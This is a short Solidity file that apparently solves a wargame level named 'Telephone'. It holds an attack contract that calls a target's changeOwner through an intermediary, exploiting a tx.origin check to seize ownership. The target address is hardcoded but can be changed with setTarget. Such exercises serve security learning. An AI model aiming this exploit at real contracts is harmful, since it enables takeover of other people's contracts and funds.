pragma solidity ^0.4.18;

contract Telephone {
  function changeOwner(address _owner) public{}
}

contract HackTelephone {
  address public owner;
  address public target;

  function HackTelephone() {
    target = 0x86d9ab33b5a363958328c9c930811b57698df362;
  }

  function setTarget(address _address) external {
    target = _address;
  }

  function changeOwner() external {
    Telephone t = Telephone(target);
    t.changeOwner(msg.sender);
  }
}
